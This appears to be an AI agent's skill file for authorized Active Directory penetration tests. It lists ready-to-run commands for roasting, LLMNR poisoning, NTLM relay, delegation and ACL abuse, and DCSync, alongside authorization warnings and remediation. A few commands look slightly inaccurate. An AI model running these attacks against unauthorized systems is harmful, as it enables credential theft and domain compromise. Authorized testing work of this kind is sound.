---
name: active-directory
description: Use for authorized internal/AD pentests - when the user has an internal IP range, VPN access, a lab, or an authorized engagement. Covers AD enumeration, AS-REP roasting, Kerberoasting, NTLM relay, password spray coordination, privilege escalation paths (BloodHound), and LLMNR poisoning. NOT for external bug bounty targets.
---

# Active Directory Security

**Scope warning:** AD attacks are for authorized internal engagements/labs only. Never against external bug bounty targets. Always confirm authorization + scope before any of this.

## Phase 0: Enumeration (no creds)

- Port scan: `python tools/port_scanner.py <ip>` — look for `53` (DNS), `88` (Kerberos), `135` (RPC), `389` (LDAP), `445` (SMB), `636` (LDAPS), `3268` (GC), `3389` (RDP), `5985` (WinRM).
- SMB null session: `nxc smb <ip> -u '' -p '' --shares` or `smbclient -L //<ip> -N`.
- LDAP anonymous: `nxc ldap <ip> -u '' -p ''` → domain name, naming context, base DN.
- DNS: `nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>` → DC list.

## Phase 1: Credential-less Attacks (roasting)

1. **AS-REP roasting** (no creds needed, needs a username list):
   - `nxc ldap <dc> -u users.txt -p '' --asreproast`
   - `impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <dc>`
   - Crack with hashcat mode 18200: `hashcat -m 18200 hashes rockyou.txt`
2. **Kerberoasting** (needs a valid account):
   - `nxc ldap <dc> -u user -p pass --kerberoasting` / `impacket-GetUserSPNs <domain>/user:pass -dc-ip <dc> -request`
   - Crack mode 13100. Target: SPNs on high-priv service accounts.
3. **LLMNR/NBT-NS poisoning** (responder, needs no creds — MITM):
   - `responder -I eth0` → capture NetNTLMv2 hashes → crack or relay.
   - Only in authorized engagement; **never** in production without explicit approval (DoS/poisoning risk).
4. **NTLM relay** (requires SMB signing disabled):
   - `ntlmrelayx -t smb://<target> -smb2support` — relay to DC for domain admin (if not protected by SMB signing/EPA).
   - Check: `nxc smb <target> -u -p --check` → "signing: False".

## Phase 2: Post-Exploitation Paths

- **BloodHound** (`bloodhound-python -u user -p pass -d domain -ns dc -c All` + `sharp-hound`) → find: DA path via GenericAll/WriteDACL/ForceChangePassword/AddMember, admin groups, constrained delegation (RC4/impersonation), unconstrained delegation (tgtdeleg).
- **Password spray** (see `credential-attack` skill): `spray` command with `--mode` for o365/okta/http-form; HARD STOP at human go/no-go.
- **Kerberos delegation abuse**: `impacket-getST -spn cifs/dc -impersonate administrator -dc-ip dc domain/user:pass` (if RBCD/constrained delegation found).
- **ACL abuse**: genericAll on user → `impacket-own`/PowerView `Set-DomainObject` to reset password of DA target.
- **GPO abuse**: write to GPO → push script → DA (via BloodHound `GPO` edges).
- **LAPS**: `nxc ldap domain -u user -p pass -M laps` if readable.

## Phase 3: Lateral Movement / Persistence (authorized only)

- WinRM `evil-winrm -i <host> -u user -p pass`, PsExec, SMB exec, DCSync (`secretsdump -just-dc`) — all require human approval at each step.

## Validation & Reporting

- Every finding needs the tool output as evidence (hash, SPN, path).
- Severity: AS-REP roast (High), Kerberoast SPN (High), NTLM relay (Critical), unauth LDAP/SMB (High), DA path (Critical).
- Include remediation: disable RC4, SMB signing, EPA, service account hardening, LAPS.

## Tools Available

- `python tools/port_scanner.py` (initial discovery)
- `commands/spray.md` / `spray_orchestrator.sh` (password spray with guards)
- `commands/breach-check.md` (HIBP wordlist ranking)
- External (install via `install_tools.sh` / docs): `nxc` (NetExec), `impacket` suite, `responder`, `bloodhound-python`, `hashcat`.

## References

- HackTricks AD: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology
- BloodHound CE: https://github.com/SpecterOps/BloodHound
- impacket: https://github.com/fortra/impacket
- PayloadsAllTheThings (Kerberos): https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Active%20Directory%20Attack
